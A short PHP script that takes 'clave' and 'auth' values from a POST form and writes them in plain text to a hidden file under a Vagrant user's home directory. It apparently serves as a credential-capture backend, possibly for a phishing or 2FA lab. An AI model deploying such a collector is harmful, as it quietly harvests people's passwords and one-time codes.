<?php
$clave = $_POST["clave"];
$auth = $_POST["auth"];
$texto = "$auth : $clave\n";

file_put_contents('/home/vagrant/.2fa/datos.txt', $texto);
?>
